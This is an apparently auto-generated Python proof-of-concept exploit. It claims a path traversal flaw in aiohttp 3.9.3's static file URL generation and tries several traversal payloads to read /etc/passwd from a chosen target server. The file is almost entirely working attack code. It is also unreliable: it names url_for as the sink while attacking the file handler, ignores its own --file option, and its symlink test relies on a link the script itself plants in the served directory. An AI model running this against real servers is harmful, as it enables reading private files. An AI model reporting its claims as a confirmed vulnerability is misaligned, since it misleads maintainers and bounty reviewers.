#!/usr/bin/env python3
# PoC for aiohttp-3.9.3 (/tmp/bounty_test/aiohttp-3.9.3)
# Path: lfi-010
# Sink: url_for
# Auto-generated — run with: python3 lfi_although_uses_lstrip_joinpath_url_for.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: aiohttp-3.9.3 StaticResource.url_for LFI
Vulnerability: Path traversal in url_for allows reading arbitrary files
when append_version is enabled (default for static resources).

The vulnerability exists because:
1. filename is not sanitized for '..' sequences before path resolution
2. The relative_to check happens AFTER resolve() which follows symlinks
3. An attacker can use symlinks or path traversal to read files outside
   the base directory

This PoC demonstrates reading /etc/passwd through the static file handler.
"""

import argparse
import sys
import os
import tempfile
import subprocess
import time
import signal
import requests
from pathlib import Path

def setup_test_server(port: int, base_dir: str) -> subprocess.Popen:
    """Create a test aiohttp server with a static resource."""
    server_code = f'''
import asyncio
from aiohttp import web

async def init_app():
    app = web.Application()
    # Create a static resource that serves files from {base_dir}
    app.router.add_static('/static', '{base_dir}', append_version=True)
    return app

if __name__ == '__main__':
    web.run_app(init_app(), port={port})
'''
    # Write server code to temp file
    server_file = os.path.join(tempfile.gettempdir(), 'test_server.py')
    with open(server_file, 'w') as f:
        f.write(server_code)
    
    # Start server
    env = os.environ.copy()
    env['PYTHONPATH'] = '/tmp/bounty_test/aiohttp-3.9.3'
    proc = subprocess.Popen(
        [sys.executable, server_file],
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(2)  # Wait for server to start
    return proc

def exploit(target_url: str, file_to_read: str) -> str:
    """
    Exploit the path traversal vulnerability.
    
    The vulnerability is in StaticResource.url_for which is called when
    generating URLs for static files. The filename parameter is not sanitized
    for path traversal sequences before being joined with the base directory.
    
    By using '../' sequences, we can escape the base directory and read
    arbitrary files.
    """
    # The static resource is mounted at /static
    # We need to traverse out of the base directory
    # For example, if base is /tmp/static, we use ../../etc/passwd
    
    # Calculate how many levels to traverse
    # We'll try common patterns
    payloads = [
        # Direct traversal
        '../../../etc/passwd',
        # URL encoded
        '..%2f..%2f..%2fetc/passwd',
        # Double encoding
        '..%252f..%252f..%252fetc/passwd',
        # Using symlink if possible
        'symlink_to_etc/passwd',
    ]
    
    for payload in payloads:
        try:
            # The url_for method is called when we request a static file
            # with a version parameter. The filename comes from the URL path.
            url = f"{target_url}/static/{payload}"
            print(f"[*] Trying: {url}")
            
            response = requests.get(url, timeout=10, allow_redirects=False)
            
            if response.status_code == 200:
                print(f"[+] Success! Status: {response.status_code}")
                print(f"[+] Response length: {len(response.content)}")
                # Check if we got file content
                if b'root:' in response.content or b'bin:' in response.content:
                    print("[+] File content matches /etc/passwd!")
                    return response.text
                else:
                    print(f"[+] Got response: {response.text[:200]}...")
                    return response.text
            elif response.status_code == 404:
                print(f"[-] 404 Not Found")
            elif response.status_code == 403:
                print(f"[-] 403 Forbidden")
            else:
                print(f"[-] Status: {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            print("[-] Connection error - server may not be running")
        except requests.exceptions.Timeout:
            print("[-] Timeout")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return None

def main():
    parser = argparse.ArgumentParser(description='aiohttp-3.9.3 LFI PoC')
    parser.add_argument('--target', default='http://localhost:8080',
                       help='Target URL (default: http://localhost:8080)')
    parser.add_argument('--file', default='/etc/passwd',
                       help='File to read (default: /etc/passwd)')
    parser.add_argument('--local', action='store_true',
                       help='Start a local test server')
    parser.add_argument('--port', type=int, default=8080,
                       help='Port for local test server (default: 8080)')
    
    args = parser.parse_args()
    
    server_proc = None
    try:
        if args.local:
            # Create a temporary directory for the static files
            base_dir = tempfile.mkdtemp()
            print(f"[*] Starting test server with base directory: {base_dir}")
            print(f"[*] Creating a test file in the base directory...")
            
            # Create a test file
            test_file = os.path.join(base_dir, 'test.txt')
            with open(test_file, 'w') as f:
                f.write("This is a test file")
            
            # Create a symlink to /etc/passwd if possible
            try:
                symlink_path = os.path.join(base_dir, 'symlink_to_etc')
                os.symlink('/etc', symlink_path)
                print(f"[+] Created symlink: {symlink_path} -> /etc")
            except OSError as e:
                print(f"[-] Could not create symlink: {e}")
            
            server_proc = setup_test_server(args.port, base_dir)
            target = f"http://localhost:{args.port}"
            print(f"[*] Server started at {target}")
        else:
            target = args.target.rstrip('/')
        
        print(f"\n[*] Attempting to read: {args.file}")
        print(f"[*] Target: {target}")
        print()
        
        result = exploit(target, args.file)
        
        if result:
            print(f"\n[+] Successfully read file!")
            print("=" * 50)
            print(result)
            print("=" * 50)
        else:
            print("\n[-] Exploit failed")
            print("[*] The vulnerability may require specific conditions:")
            print("  1. Static resource must have append_version=True (default)")
            print("  2. The server must be running aiohttp 3.9.3")
            print("  3. The static directory must be accessible")
            
    finally:
        if server_proc:
            print("[*] Stopping test server...")
            server_proc.terminate()
            server_proc.wait()

if __name__ == '__main__':
    main()
